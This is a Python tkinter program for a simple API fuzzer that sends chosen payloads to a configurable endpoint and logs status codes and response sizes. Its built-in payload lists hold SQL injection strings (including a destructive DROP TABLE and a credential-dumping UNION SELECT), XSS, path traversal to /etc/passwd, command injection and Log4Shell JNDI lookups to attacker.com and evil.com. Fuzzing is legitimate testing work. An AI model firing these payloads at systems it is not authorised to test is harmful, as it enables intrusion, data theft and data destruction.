import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import requests
import threading
import json
from urllib.parse import urljoin
import time

class APIFuzzer:
    def __init__(self, root):
        self.root = root
        self.root.title("Simple API Fuzzer")
        self.root.geometry("900x700")

        self.create_widgets()

    def create_widgets(self):
        # === Top Frame - Target ===
        top_frame = ttk.LabelFrame(self.root, text="Target API", padding=10)
        top_frame.pack(fill="x", padx=10, pady=5)

        ttk.Label(top_frame, text="Base URL:").grid(row=0, column=0, sticky="w")
        self.base_url = ttk.Entry(top_frame, width=60)
        self.base_url.insert(0, "https://httpbin.org")
        self.base_url.grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(top_frame, text="Endpoint:").grid(row=1, column=0, sticky="w")
        self.endpoint = ttk.Entry(top_frame, width=60)
        self.endpoint.insert(0, "/post")
        self.endpoint.grid(row=1, column=1, padx=5, pady=5)

        # Method
        ttk.Label(top_frame, text="Method:").grid(row=2, column=0, sticky="w")
        self.method = ttk.Combobox(top_frame, values=["GET", "POST"], state="readonly", width=10)
        self.method.set("POST")
        self.method.grid(row=2, column=1, sticky="w", padx=5, pady=5)

        # === Payloads Frame ===
        payload_frame = ttk.LabelFrame(self.root, text="Fuzzing Payloads", padding=10)
        payload_frame.pack(fill="x", padx=10, pady=5)

        self.payload_list = tk.Listbox(payload_frame, height=8, selectmode="multiple")
        self.payload_list.pack(fill="both", expand=True, padx=5, pady=5)

        # Add default simple payloads
        default_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "'; DROP TABLE users; --",
            "${jndi:ldap://attacker.com}",
            "1; ls -la",
            "<img src=x onerror=alert(1)>",
            "admin' --",
            "1 UNION SELECT null, username, password FROM users --",
            "true",
            "false",
            "0",
            "-1",
            "999999999999999999999"
        ]

        for p in default_payloads:
            self.payload_list.insert(tk.END, p)

        # Buttons for payloads
        btn_frame = ttk.Frame(payload_frame)
        btn_frame.pack(fill="x", pady=5)

        ttk.Button(btn_frame, text="Add Payload", command=self.add_payload).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Clear Payloads", command=self.clear_payloads).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Load Common Payloads", command=self.load_common_payloads).pack(side="left", padx=5)

        # === Fuzzing Controls ===
        control_frame = ttk.Frame(self.root)
        control_frame.pack(fill="x", padx=10, pady=10)

        ttk.Button(control_frame, text="Start Fuzzing", command=self.start_fuzzing, style="Accent.TButton").pack(side="left", padx=5)
        ttk.Button(control_frame, text="Stop", command=self.stop_fuzzing).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Clear Log", command=self.clear_log).pack(side="left", padx=5)

        # === Log Area ===
        log_frame = ttk.LabelFrame(self.root, text="Fuzzing Log", padding=10)
        log_frame.pack(fill="both", expand=True, padx=10, pady=5)

        self.log_text = scrolledtext.ScrolledText(log_frame, height=25, state='disabled', font=("Consolas", 10))
        self.log_text.pack(fill="both", expand=True)

        # Style
        style = ttk.Style()
        style.configure("Accent.TButton", font=("Arial", 10, "bold"))

    def log(self, message):
        self.log_text.config(state='normal')
        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state='disabled')
        self.root.update_idletasks()

    def add_payload(self):
        payload = tk.simpledialog.askstring("Add Payload", "Enter new payload:")
        if payload:
            self.payload_list.insert(tk.END, payload.strip())

    def clear_payloads(self):
        self.payload_list.delete(0, tk.END)

    def load_common_payloads(self):
        self.clear_payloads()
        default_payloads = [
            "' OR '1'='1", "' OR '1'='1' --", "<script>alert(1)</script>",
            "../../../etc/passwd", "1; ls -la", "<img src=x onerror=alert(1)>",
            "admin' --", "1 UNION SELECT null, username, password FROM users --",
            "${jndi:ldap://evil.com/a}", "0", "-1", "999999999999999"
        ]
        for p in default_payloads:
            self.payload_list.insert(tk.END, p)

    def start_fuzzing(self):
        base = self.base_url.get().strip()
        endpoint = self.endpoint.get().strip()
        method = self.method.get()

        if not base or not endpoint:
            messagebox.showerror("Error", "Base URL and Endpoint are required!")
            return

        selected_indices = self.payload_list.curselection()
        if not selected_indices:
            messagebox.showwarning("Warning", "Please select at least one payload!")
            return

        payloads = [self.payload_list.get(i) for i in selected_indices]

        self.log("=== API Fuzzing Started ===")
        self.log(f"Target: {base}{endpoint} | Method: {method}")
        self.log(f"Total payloads: {len(payloads)}\n")

        # Run fuzzing in a separate thread
        threading.Thread(target=self.fuzz_worker, args=(base, endpoint, method, payloads), daemon=True).start()

    def fuzz_worker(self, base_url, endpoint, method, payloads):
        full_url = urljoin(base_url, endpoint)

        for i, payload in enumerate(payloads, 1):
            try:
                self.log(f"[{i}/{len(payloads)}] Testing payload: {payload[:80]}{'...' if len(payload)>80 else ''}")

                data = {"input": payload, "test": payload}
                headers = {"Content-Type": "application/json", "User-Agent": "API-Fuzzer"}

                if method == "POST":
                    response = requests.post(full_url, json=data, headers=headers, timeout=10)
                else:
                    params = {"q": payload}
                    response = requests.get(full_url, params=params, headers=headers, timeout=10)

                status = response.status_code
                length = len(response.text)

                color = "GREEN" if status == 200 else "RED" if status >= 500 else "YELLOW"

                self.log(f"→ Status: {status} | Length: {length} | Payload: {payload[:50]}...")

                # Highlight interesting responses
                if status in [200, 500, 502, 503] or length > 1000:
                    self.log(f"   *** Interesting response detected! Status={status}, Size={length} ***")

            except requests.exceptions.RequestException as e:
                self.log(f"   Error: {str(e)[:100]}")
            except Exception as e:
                self.log(f"   Unexpected error: {e}")

            time.sleep(0.3)  # Small delay to not overwhelm the target

        self.log("\n=== Fuzzing Completed ===\n")

    def stop_fuzzing(self):
        self.log("Stop requested (current request will finish)...")

    def clear_log(self):
        self.log_text.config(state='normal')
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state='disabled')


if __name__ == "__main__":
    root = tk.Tk()
    app = APIFuzzer(root)
    root.mainloop()
